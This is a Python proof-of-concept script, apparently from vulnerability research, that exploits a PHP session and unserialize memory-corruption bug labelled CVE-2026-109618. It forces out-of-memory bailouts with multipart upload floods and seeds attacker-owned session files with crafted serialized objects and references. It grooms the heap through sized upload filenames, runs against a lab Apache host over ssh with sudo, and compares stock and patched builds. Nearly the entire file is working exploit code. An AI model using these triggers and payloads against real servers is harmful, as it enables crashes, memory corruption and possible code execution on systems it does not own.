#!/usr/bin/env python3
"""CVE-2026-109618 corruption leg — staleness-free probe that the stale
BG(unserialize) bookkeeping published by R1's parse-window OOM bailout is
CONSUMED by a later request on the same worker.

VENUE NOTE (measured 10/21): php -S is structurally immune — its RINIT
(basic_functions zeroes BG(serialize)/BG(unserialize); session globals reset)
runs BEFORE body parse, so R2's windows always start from fresh globals.
Cross-request consumption of 618-a needs Apache's parse-before-startup hook
phase: mod_php prefork on .170 is the venue. Bench runs remain as controls.

Sequence per run:
  seed   : write attacker-owned session file sess_<SID> (ps_encode form).
  R1 arm : multipart churn (vendor shape) -> parse-window OOM bailout frees
           request heap with var state published. NOARM=1 skips (control).
  R2     : GET ?PHPSESSID=<SID> -> app session_start() decodes the seeded
           file THROUGH whatever state survives. Readback: body dump +
           session-file after-state + worker liveness.

Env: VENUE=bench|remote  RHOST RPORT  N_PARTS FILLEN  NOARM=1
"""
import os, shlex, socket, subprocess, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
VENUE = os.environ.get('VENUE', 'bench')
PORT = int(os.environ.get('PORT', '18914'))
RHOST = os.environ.get('RHOST', '192.168.51.170')
RPORT = int(os.environ.get('RPORT', '18990'))
PHP_BIN = os.environ.get('PHP_BIN', 'php')
N_PARTS = int(os.environ.get('N_PARTS', '4000'))
FILLEN = int(os.environ.get('FILLEN', '0'))
SESS = '/tmp/sess' if VENUE == 'remote' else '/tmp/cve2-sess'
# PHP-shaped 26-char SID in [0-9a-v] (sid_length=26, sid_bits_per_character=5
# on .170): 25-char and Cookie-header transports both fail to bind there.
# NOTE: on mod_php .170 only the warmup-shape string binds (measured 10/21:
# 'warmup0000...' binds, hex-shaped 'c0rp51d...' does not; bench unaffected).
SID = os.environ.get('CORP_SID', 'warmup00000000000000000000')
SESSFILE = SESS + '/sess_' + SID
BOUND = '-------------------cve2corp'
APPPATH = os.environ.get('APPPATH', 'cve2_app.php' if VENUE == 'remote' else '')

INI = ['-d', 'memory_limit=4M', '-d', 'post_max_size=64M',
       '-d', 'upload_max_filesize=32M',
       '-d', 'max_input_vars=10000000', '-d', 'max_file_uploads=1000000',
       '-d', 'max_multipart_body_parts=10000000',
       '-d', 'session.save_path=%s' % SESS,
       '-d', 'session.upload_progress.enabled=1',
       '-d', 'session.upload_progress.cleanup=0',
       '-d', 'session.upload_progress.min_freq=0',
       '-d', 'session.upload_progress.freq=1',
       '-d', 'session.use_only_cookies=0',
       '-d', 'session.use_strict_mode=0']

PAYLOADS = {
    'benign':    'a|s:3:"xyz";',
    'object':    'o|O:5:"Probe":1:{s:1:"p";s:4:"cmdl";}',
    'objbig':    'k|a:30:{' + ''.join(
                     'i:%d;O:5:"Probe":2:{s:1:"a";s:%d:"%s";s:1:"b";b:1;}' % (i, 3 + (i % 60), 'z' * (3 + (i % 60)))
                     for i in range(30)) + '}',
    'objR1500':  'k|a:2:{i:0;O:5:"Probe":1:{s:1:"p";s:4:"cmdl";}i:1;R:1500;}',
    # 1200 valid entries: n>1018 forces php_add_var_hash EXTENSION (realloc
    # frees the old entries chunk) while every R: stays in range.
    'objRmix':   'k|a:1200:{i:0;O:5:"Probe":1:{s:1:"p";s:4:"cmdl";}'
                 + ''.join('i:%d;i:%d;' % (i, i) for i in range(1, 1199))
                 + 'i:1199;R:1;}',
}

def _ssh(cmd):
    return subprocess.run(['ssh', 'jacob@' + RHOST, cmd], capture_output=True, text=True)

def seed_session(content):
    if VENUE == 'remote':
        # /tmp/sess is sticky and PHP writes session files 0600 www-data:
        # jacob's rm/redirect both fail silently without sudo there.
        _ssh("sudo rm -f %s; printf '%%s' %s | sudo tee %s >/dev/null; sudo chmod 666 %s" % (
            SESSFILE, shlex.quote(content), SESSFILE, SESSFILE))
    else:
        os.makedirs(SESS, exist_ok=True)
        with open(SESSFILE, 'w') as f:
            f.write(content)

def read_session():
    if VENUE == 'remote':
        return _ssh('sudo cat %s 2>/dev/null' % SESSFILE).stdout
    try:
        with open(SESSFILE) as f:
            return f.read()
    except OSError:
        return ''

def hostport():
    return (RHOST, RPORT) if VENUE == 'remote' else ('127.0.0.1', PORT)

def http_get(path, cookie=''):
    host, port = hostport()
    try:
        s = socket.create_connection((host, port), timeout=30)
    except OSError as e:
        return 'CONNECT-FAIL(%s)' % e, ''
    s.sendall(("GET %s HTTP/1.1\r\nHost: x\r\n%sConnection: close\r\n\r\n" % (path, cookie)).encode())
    data = b''
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    s.close()
    txt = data.decode('utf-8', 'replace')
    head, body = (txt.split('\r\n\r\n', 1) + [''])[:2]
    stat = head.split('\r\n', 1)[0] if head else 'NO-REPLY'
    return stat, body

def http_post(body):
    host, port = hostport()
    try:
        s = socket.create_connection((host, port), timeout=120)
    except OSError as e:
        return 'CONNECT-FAIL(%s)' % e
    path = '/' + APPPATH if VENUE == 'remote' else '/'
    if path == '/':
        path = '/' + APPPATH if APPPATH else '/'
    hdr = ("POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n") % (path, BOUND, len(body))
    try:
        s.sendall(hdr.encode() + body)
    except BrokenPipeError:
        pass
    except TimeoutError:
        s.close()
        return 'SEND-TIMEOUT(worker not reading)'
    data = b''
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    s.close()
    txt = data.decode('utf-8', 'replace')
    return (txt.split('\r\n', 1)[0] if txt else 'NO-REPLY(aborted)')

def arm_body():
    def fld(n, v):
        return ('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n' % (BOUND, n, v)).encode()
    parts = [fld('PHPSESSID', 'armsid0abcdef0123456789'), fld('PHP_SESSION_UPLOAD_PROGRESS', 'k')]
    n = N_PARTS if VENUE != 'remote' else int(os.environ.get('N_PARTS', '4000'))
    fill = FILLEN if VENUE != 'remote' else int(os.environ.get('FILLEN', '300'))
    for i in range(n):
        nm = ('u%d' % i).ljust(fill, 'A') if fill else 'u%d' % i
        fn = ('f%d.txt' % i).ljust(fill, 'A') if fill else 'f%d.txt' % i
        parts.append(('--%s\r\nContent-Disposition: form-data; name="%s"; filename="%s"\r\n'
                      'Content-Type: text/plain\r\n\r\nxxxxxxxx\r\n' % (BOUND, nm, fn)).encode())
    return b''.join(parts) + b'--' + BOUND.encode() + b'--\r\n'

GATE_SID = 'gate0000000000000000000000aa'

def probe_binding():
    if VENUE != 'remote':
        return True
    # Test the channel that actually matters on this distro build: the
    # upload-progress WINDOW binding multipart PHPSESSID. Binding is proven
    # by the window's write-back creating the gate sid's session file.
    body = groom_upload_body(GATE_SID)
    micro = (b'--%s\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n%s\r\n'
             b'--%s\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\ng\r\n'
             b'--%s\r\nContent-Disposition: form-data; name="f"; filename="n.txt"\r\n'
             b'Content-Type: text/plain\r\n\r\nx\r\n'
             b'--%s--\r\n') % tuple(x.encode() for x in (BOUND, GATE_SID, BOUND, BOUND, BOUND))
    _ssh('sudo rm -f %s/sess_%s' % (SESS, GATE_SID))
    st = http_post(micro)
    r = _ssh('sudo test -s %s/sess_%s && echo BOUND' % (SESS, GATE_SID))
    return r.returncode == 0 and 'BOUND' in r.stdout

def warm_child(timeout_s=15):
    """Gate the child on upload-window sid binding; restart once if the
    child sits in a bailowed published state. Returns True on success."""
    for _ in range(2):
        if probe_binding():
            return True
        subprocess.run(['ssh', 'jacob@' + RHOST,
                        '. /etc/apache2/envvars && sudo -E /usr/sbin/apache2 -k restart >/dev/null 2>&1'],
                       capture_output=True)
        time.sleep(3)
    return False

def groom_upload_body(sid, progkey='k'):
    """Vendor-shape multipart whose file-name zend_strings re-groom the
    arena slots the R1 bailout freed: 3 x ~8100B names (entries-array bins),
    120 x ~224B names (256B bins), then small parts to cross chunk
    boundaries so the progress handler runs inside the parse window."""
    def fld(n, v):
        return ('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n' % (BOUND, n, v)).encode()
    def filepart(nm, fn):
        return ('--%s\r\nContent-Disposition: form-data; name="%s"; filename="%s"\r\n'
                'Content-Type: text/plain\r\n\r\nxxxxxxxx\r\n' % (BOUND, nm, fn)).encode()
    parts = [fld('PHPSESSID', sid), fld('PHP_SESSION_UPLOAD_PROGRESS', progkey)]
    forged = os.environ.get('GROOM_BYTES', '')
    for i in range(3):
        nm = ('e%d' % i, (forged if (forged and i == 0) else ('BIG%d' % i).ljust(8100, 'E')))
        parts.append(filepart(nm[0], nm[1]))
    for i in range(120):
        parts.append(filepart('g%d' % i, ('G%03d' % i).ljust(224, 'G')))
    for i in range(60):
        parts.append(filepart('s%d' % i, 'sm.txt'))
    return b''.join(parts) + b'--' + BOUND.encode() + b'--\r\n'

def run_payload(name, content, php_bin, label):
    if VENUE != 'remote':
        subprocess.run(['rm', '-rf', SESS])
    else:
        # venue hygiene: upload_progress entries bloat run-over-run with
        # cleanup=0 + 8k-part arms; decode cost per chunk is O(entry size)
        _ssh('sudo rm -f /tmp/sess/sess_armsid*')
        if not warm_child():
            print('  [%s/%s] WARM-FAILED (child will not bind sid; skipping run)' % (label, name))
            return {}
    seed_session(content)
    srv = None
    if VENUE != 'remote':
        srv = subprocess.Popen(['setarch', '-R', php_bin, '-S', '127.0.0.1:%d' % PORT] + INI +
                               [os.path.join(HERE, 'cve2_app.php')],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.8)
    try:
        r1 = 'SKIPPED(no-arm)' if os.environ.get('NOARM') == '1' else ''
        postbind = None
        if not r1:
            for _attempt in range(3):   # survival (200) = OOM missed the storm edge; retry
                r1 = http_post(arm_body())
                if '500' in r1 or 'aborted' in r1:
                    break
                if 'TIMEOUT' in r1 or 'FAIL' in r1:      # parser chewing body-EOF storm; let venue recover
                    for _q in range(12):
                        time.sleep(5)
                        st_x, _ = http_get('/' if VENUE != 'remote' else '/' + APPPATH)
                        if st_x not in ('NO-REPLY',) and 'CONNECT-FAIL' not in st_x:
                            break
                    r1 = 'STORMED(%s)' % r1
                    break
                r1 = 'MISSED(%s)' % r1
            if VENUE == 'remote':
                postbind = 'binds' if probe_binding() else 'PUBLISHED-STATE(no sid bind post-arm)'
        r2path = ('/' + APPPATH + '?PHPSESSID=%s' % SID) if VENUE == 'remote' else ('/?PHPSESSID=%s' % SID)
        if os.environ.get('R2UPLOAD') == '1':
            r2stat, r2body = http_post(groom_upload_body(SID)), ''
            # http_post returns a status string only; synthesize the pair
            r2stat, r2body = (lambda s: (s.split('\r\n', 1)[0] if s.startswith('HTTP') else s, ''))(r2stat)
        else:
            r2stat, r2body = http_get(r2path)
        r3stat, r3body = http_get('/' if VENUE != 'remote' else '/' + APPPATH)
        dead = 'CONNECT-FAIL' in r3stat or r3stat == 'NO-REPLY'
        after = read_session()
        lines = [l for l in r2body.splitlines() if l.startswith(('CVE2-OK', 'k:'))]
        print('  [%s/%s%s] R1=%s R2=%s worker_dead=%s%s' % (label, name,
              '-ARMED' if os.environ.get('NOARM') != '1' else '-NOARM',
              r1, r2stat, dead,
              (' post_arm=' + postbind) if postbind else ''))
        print('    R2 body: %s' % (' | '.join(lines) if lines else repr(r2body[:80])))
        print('    sessfile after R2: %r' % (after[:90],))
        if VENUE == 'remote':
            log = _ssh('sudo tail -n 5 /var/log/apache2/error.log 2>/dev/null').stdout
            extra = [l for l in log.splitlines()
                     if 'PHP Notice' in l or 'PHP Warning' in l or 'Fatal' in l or 'Uncaught' in l
                     or 'signal' in l.lower() or 'Segmentation' in l]
            if extra:
                print('    error.log: %s' % ' || '.join(x.split(']', 2)[-1].strip() for x in extra[-2:]))
        return dict(r1=r1, r2=r2stat, dead=dead, body=lines, after=after)
    finally:
        if srv:
            srv.terminate(); srv.wait()

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'stock'
    php = PHP_BIN
    label = 'stock 8.3.6'
    if mode == 'patched':
        php = os.path.join(ROOT, 'php-8.3.36', 'sapi', 'cli', 'php')
        label = 'patched 8.3.36'
    only = os.environ.get('ONLY')
    for name, content in PAYLOADS.items():
        if only and name != only:
            continue
        run_payload(name, content, php, label)

if __name__ == '__main__':
    main()
